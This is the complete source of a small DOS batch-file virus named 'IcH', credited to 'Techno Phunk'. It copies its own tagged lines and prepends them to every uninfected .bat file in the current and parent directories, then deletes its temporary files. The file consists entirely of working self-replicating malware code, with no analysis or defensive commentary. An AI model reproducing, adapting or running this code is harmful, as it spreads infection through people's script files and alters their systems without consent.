@echo off %-IcH%
if "%0=="IcH goto iIcH
if not exist %0.Bat goto IcH
find "IcH"<%0.Bat>IcH.Bat
for %%J in (..\*.bat *.bat) do call IcH %%J
del IcH.*
:: [IcH] by Techno Phunk
goto IcH
:iIcH
find "IcH"<%1>nul
if not errorlevel 1 goto IcH
copy %0.Bat+%1 IcH|type IcH>%1
:IcH
